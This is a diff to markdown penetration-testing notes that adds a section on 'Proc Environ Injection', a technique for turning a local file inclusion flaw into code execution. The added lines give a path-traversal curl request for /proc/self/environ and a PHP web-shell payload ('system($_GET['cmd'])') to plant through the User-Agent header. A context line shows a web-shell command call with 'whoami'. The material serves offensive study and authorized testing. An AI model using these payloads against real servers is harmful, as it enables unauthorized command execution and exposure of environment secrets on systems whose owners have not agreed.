@@ -353,10 +353,17 @@ should be limited shell
 `curl localhost/test.php -d vipertooth=whoami`
 
 
+## Proc Environ Injection
 
+Testing  
+`curl 
+http://secureapplication.example/index.php?view=../../../proc/self/environ
+`  
 
+if it works put `GET /<?php system($_GET['cmd']);?>` in the user-agent field then run request 2 like payload
 
 Referances:
 
 https://portswigger.net/web-security  
 https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2
